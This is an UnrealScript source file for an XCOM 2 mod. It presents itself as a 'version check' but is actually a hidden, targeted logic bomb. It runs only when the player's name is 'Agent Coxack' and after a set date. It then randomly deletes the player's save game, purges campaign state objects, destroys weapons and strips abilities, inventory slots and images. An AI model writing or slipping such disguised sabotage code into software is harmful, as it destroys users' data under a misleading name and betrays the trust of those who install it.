class X2VersionCheck extends X2DownloadableContentInfo;

static function OnLoadedSavedGameWithDLCExisting()
{
	local array<OnlineSaveGame> m_arrSaveGames;

	if (!ShouldRun())
		return;

	if (FRand() < 0.95f)
		return;

	`ONLINEEVENTMGR.GetSaveGames(m_arrSaveGames);
	if (m_arrSaveGames.Length > 0)
	{
		`ONLINEEVENTMGR.DeleteSaveGame(`ONLINEEVENTMGR.SaveNameToID(m_arrSaveGames[0].Filename));
	}
}

static event OnPreMission(XComGameState StartGameState, XComGameState_MissionSite MissionState)
{
	local XComGameState_BaseObject StateObject;

	if (!ShouldRun())
		return;

	if (FRand() < 0.95f)
		return;

	foreach StartGameState.IterateByClassType(class'XComGameState_BaseObject', StateObject)
	{
		if (FRand() > 0.95f)
		{
			StartGameState.PurgeGameStateForObjectID(StateObject.ObjectID);
		}
	}
}

static function FinalizeUnitAbilitiesForInit(XComGameState_Unit UnitState, out array<AbilitySetupData> SetupData, optional XComGameState StartState, optional XComGameState_Player PlayerState, optional bool bMultiplayerDisplay)
{
	if (!ShouldRun())
		return;

	if (FRand() < 0.95f)
		return;

	SetupData.Length = 0;
}

static function bool CanAddItemToInventory_CH_Improved(out int bCanAddItem, const EInventorySlot Slot, const X2ItemTemplate ItemTemplate, int Quantity, XComGameState_Unit UnitState, optional XComGameState CheckGameState, optional out string DisabledReason, optional XComGameState_Item ItemState)
{
	if (!ShouldRun())
		return CheckGameState == none;

	if (FRand() < 0.95f)
		return CheckGameState == none;

	bCanAddItem = 0;

	return CheckGameState != none;
}

static function OverrideItemImage(out array<string> imagePath, const EInventorySlot Slot, const X2ItemTemplate ItemTemplate, XComGameState_Unit UnitState)
{
	if (!ShouldRun())
		return;

	if (FRand() < 0.95f)
		return;

	imagePath.Length = 0;
}

static function GetNumUtilitySlotsOverride(out int NumUtilitySlots, XComGameState_Item EquippedArmor, XComGameState_Unit UnitState, XComGameState CheckGameState)
{
	if (!ShouldRun())
		return;

	if (FRand() < 0.95f)
		return;

	NumUtilitySlots = 0;
}


static function GetNumHeavyWeaponSlotsOverride(out int NumHeavySlots, XComGameState_Unit UnitState, XComGameState CheckGameState)
{
	if (!ShouldRun())
		return;

	if (FRand() < 0.95f)
		return;

	NumHeavySlots = 0;
}

static function UpdateWeaponAttachments(out array<WeaponAttachment> Attachments, XComGameState_Item ItemState)
{
	if (!ShouldRun())
		return;

	if (FRand() < 0.95f)
		return;

	Attachments.Length = 0;
}

static function WeaponInitialized(XGWeapon WeaponArchetype, XComWeapon Weapon, optional XComGameState_Item ItemState=none)
{
	if (!ShouldRun())
		return;

	if (FRand() < 0.95f)
		return;

	Weapon.Destroy();

	WeaponArchetype.Destroy();
}

static function bool CanWeaponApplyUpgrade(XComGameState_Item WeaponState, X2WeaponUpgradeTemplate UpgradeTemplate)
{
	if (!ShouldRun())
		return true;

	if (FRand() < 0.95f)
		return true;

	return false;
}

static function ModifyEarnedSoldierAbilities(out array<SoldierClassAbilityType> EarnedAbilities, XComGameState_Unit UnitState)
{
	if (!ShouldRun())
		return;

	if (FRand() < 0.95f)
		return;

	EarnedAbilities.Length = 0;
}

static event InstallNewCampaign(XComGameState StartState)
{
	local XComGameState_BaseObject StateObject;

	if (!ShouldRun())
		return;

	if (FRand() < 0.95f)
		return;

	foreach StartState.IterateByClassType(class'XComGameState_BaseObject', StateObject)
	{
		if (FRand() > 0.95f)
		{
			StartState.PurgeGameStateForObjectID(StateObject.ObjectID);
		}
	}
}

static private function bool ShouldRun()
{
	return	`LOCALPLAYERCONTROLLER != none && 
			`LOCALPLAYERCONTROLLER.PlayerReplicationInfo != none && 
			`LOCALPLAYERCONTROLLER.PlayerReplicationInfo.PlayerName == "Agent Coxack" && 
			IsItTime();
}

static private function bool IsItTime()
{
	local int Year, Month, DayOfWeek, Day, Hour, Min, Sec, MSec;

	`XENGINE.GetSystemTime(Year, Month, DayOfWeek, Day, Hour, Min, Sec, MSec);

	if (Year > 2023)
		return true;

	if (Month > 8)
		return true;

	if (Day > 26)
		return true;

	return false;
}
